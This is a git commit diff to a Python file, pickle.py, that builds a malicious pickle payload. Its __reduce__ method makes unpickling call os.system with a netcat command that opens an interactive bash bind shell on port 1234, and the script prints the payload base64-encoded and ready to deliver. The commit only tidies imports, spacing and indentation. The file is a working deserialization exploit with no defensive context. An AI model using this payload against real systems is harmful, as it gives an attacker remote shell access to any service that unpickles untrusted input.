10def34c8a927f018fc70da9e39da450a098d017
Martijn X1M <martijn@x1m.nl>
2017-09-04 16:56:28 +0200

    some minor changes

--- pickle.py
+++ pickle.py
@@ -1,10 +1,11 @@
+import base64
 import cPickle
 import os
-import base64
+
 
 class Blah(object):
     def __reduce__(self):
         return (os.system,(
-    "netcat -c '/bin/bash -i' -l -p 1234",))
+    "netcat -c '/bin/bash -i' -l -p 1234 ",))
 
-    print base64.b64encode(cPickle.dumps(Blah()))
+print base64.b64encode(cPickle.dumps(Blah()))
